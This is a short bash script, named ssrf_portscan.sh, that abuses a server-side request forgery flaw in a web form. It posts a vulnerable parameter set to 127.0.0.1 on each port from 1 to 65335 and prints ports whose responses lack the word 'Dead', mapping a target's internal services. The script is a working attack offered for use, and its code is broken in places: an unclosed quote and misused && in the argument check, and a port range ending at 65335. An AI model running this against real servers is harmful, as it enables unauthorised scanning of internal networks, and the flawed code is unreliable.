#!/bin/bash

if [  -z "$1" && -z "$2]; then
    echo "Usage ./ssrf_portscan.sh [url] [vulnerable urlparameter]"
    exit 1
fi

for i in $(seq 1 65335)
do
	curl -X POST -d "${2}=127.0.0.1:${i}"  -H "Content-Type: application/x-www-form-urlencoded"   "${1}" --silent | grep -L 'Dead' &> /dev/null 

	if [ $? == 1 ]; then
		echo "open port: ${i}"
	fi
done
